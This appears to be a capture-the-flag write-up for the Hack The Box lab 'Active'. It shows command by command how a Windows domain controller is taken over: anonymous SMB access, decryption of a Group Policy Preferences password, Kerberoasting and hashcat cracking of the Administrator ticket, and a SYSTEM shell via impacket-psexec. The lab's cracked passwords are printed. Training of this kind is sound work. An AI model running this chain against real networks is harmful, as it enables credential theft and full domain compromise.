## Active

### Lab Details 

- Difficulty: Easy
- Type: SMB, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 14:54:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
```
- check anonymous access with `nxc` on `SMB`
```bash
$ nxc smb active.htb -u "" -p "" --shares
SMB         10.129.146.6    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.146.6    445    DC               [+] active.htb\: 
SMB         10.129.146.6    445    DC               [*] Enumerated shares
SMB         10.129.146.6    445    DC               Share           Permissions     Remark
SMB         10.129.146.6    445    DC               -----           -----------     ------
SMB         10.129.146.6    445    DC               ADMIN$                          Remote Admin
SMB         10.129.146.6    445    DC               C$                              Default share
SMB         10.129.146.6    445    DC               IPC$                            Remote IPC
SMB         10.129.146.6    445    DC               NETLOGON                        Logon server share 
SMB         10.129.146.6    445    DC               Replication     READ            
SMB         10.129.146.6    445    DC               SYSVOL                          Logon server share 
SMB         10.129.146.6    445    DC               Users           
```
- we have anonymous read access over `Replication` share
#### Initial Foothold 
- attempt to download all remote content in `Replication` share
```bash
$ smbclient \\\\10.129.146.6\\Replication -N 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
<snip>
```
- use `tree` to list content in the folders
```bash
$ tree
<snip>
│   │   │   │   ├── Preferences
│   │   │   │   │   └── Groups
│   │   │   │   │       └── Groups.xml
<snip>
```
- check the `Groups.xml`
![[Groups.xml.png]]
- found login of user `SVC_TGS`
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
- use `gpp-decrypt` to decrypt the password hash
```bash
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcq+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
- use `smbmap` to enumerate the `SMB` service again
```bash
$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.209.131
[+] IP: 10.129.209.131:445	Name: 10.129.209.131                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
```
- found we have have read access over the `Users` share
- download all contents 
```bash
$ smbclient -U SVC_TGS \\\\10.129.209.131\\Users
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		10459647 blocks of size 4096. 5201181 blocks available
$ smb: \> RECURSE ON
$ smb: \> PROMPT OFF
$ smb: \> mget *
```
- use `tree` to list folder contents 
```bash
$ tree ./
<sniP
├── Public
└── SVC_TGS
    ├── Contacts
    ├── Desktop
    │   └── user.txt
    ├── Downloads
    ├── Favorites
<snip>
```
#### Lateral Movement (If any)

#### Privilege Escalation
- since we have a legitimate AD account we can perform `Kerberoasting`  
- first identify accounts with `SPN` configured
```bash
$ ldapsearch -x -H 'ldap://10.129.146.6' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))
# requesting: serviceprincipalname 
#

# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445

# search reference
ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb

# search reference
ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb

# search reference
ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
- `Administrator` has `SPN` configured and active
- get the `TGS` hash
```bash
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.146.6 -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-09-26 10:17:28.592139             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e0d820fead2bbccbe6be3e206efc7088$38eb39635dfe41b139321f3e49ea1c9b6b60d80dc5cdab51f9ff0bd5e909286083c8bc01db45a4efbf8735689ef7f911a18e16c78026c79d94c3457ae66951a82de2bc4f32fc83c4a8<snip>
```
- use `hashcat` to decrypt the hash
```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt

<snip>
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e0d820fead2bbccbe6be3e206efc7088$38eb39635dfe41b139321f3e49ea1c9b6b60d80dc5cdab51f9ff0bd5e909286083c8bc01db45a4efbf8735689ef7f911a18e16c78026c79d94c3457ae66951a82de2bc4f32fc83c4a86c1b3300191a953f9ab2797121de850c7488a28389945ffd9d4a57255d224e400d2755b64d8141e386a2d12de9d8b06818e17d29ae42303f93dc8724ad360bcc256d785c735ae806d706d00d437c7ed66e<snip>:Ticketmaster1968
<snip>

```
- use `impacket-psexec` to get a reverse shell on target 
```bash
$ impacket-psexec 'Administrator:Ticketmaster1968@Active.htb'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on Active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file QDhSGvjB.exe
[*] Opening SVCManager on Active.htb.....
[*] Creating service iGKq on Active.htb.....
[*] Starting service iGKq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
#### Resources

#### Lesson Learned
